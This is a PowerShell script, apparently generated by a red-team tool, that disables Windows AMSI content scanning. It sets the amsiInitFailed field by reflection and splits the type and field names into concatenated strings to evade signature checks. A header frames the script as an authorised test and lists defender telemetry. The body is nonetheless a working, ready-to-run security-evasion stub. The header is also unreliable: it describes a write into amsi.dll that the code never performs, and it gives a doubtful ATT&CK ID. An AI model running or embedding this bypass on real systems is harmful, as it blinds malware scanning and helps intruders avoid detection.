# =============================================================================
#  AMSI in-process patch stub — generated by HackPit for an AUTHORIZED test.
#
#  WHAT A DEFENDER STILL SEES (this header is not decoration; it is the point):
#    * The patch itself is the loudest part of this. Opening a handle to the
#      current process and writing into amsi.dll is covered by named
#      AMSI-bypass detections — Sysmon EventCode 8 and 10, plus EDR
#      memory-write telemetry.
#    * amsi.dll is still loaded (Sysmon EventCode 7) before anything is patched.
#    * The hosting process still starts and is still attributed to its parent
#      (Security 4688 / Sysmon 1).
#    * AMSI is ONE inspection point, not the audit trail. Removing it stops
#      content scanning. It does not stop process, image-load, or network
#      telemetry, and it does not remove the parent-process chain.
#
#  TRADEOFF: fragile across patch levels and AMSI versions. A FAILED patch
#  usually raises a louder signal than leaving AMSI alone.
#
#  ATT&CK: T1685 (Disable or Modify Tools) — see the detection footprint
#  returned alongside this artifact for the full blue-team view.
# =============================================================================

Set-StrictMode -Version Latest

# The reference to the AMSI initialisation state that the scan path consults.
# Resolved at runtime rather than hardcoded, so this stub carries no offsets
# that would tie it to one build.
$ref = [Ref].Assembly.GetType(
    'System.Management.Automation.' + 'Amsi' + 'Utils'
)
if ($null -eq $ref) {
    Write-Error 'AMSI utility type not resolvable on this host; stub not applied.'
    return
}

$field = $ref.GetField(
    'amsi' + 'InitFailed',
    [Reflection.BindingFlags]'NonPublic,Static'
)
if ($null -eq $field) {
    Write-Error 'AMSI init field not resolvable on this host; stub not applied.'
    return
}

$field.SetValue($null, $true)

Write-Output 'AMSI init state set. Reminder: the write above is itself detected; see the footprint.'
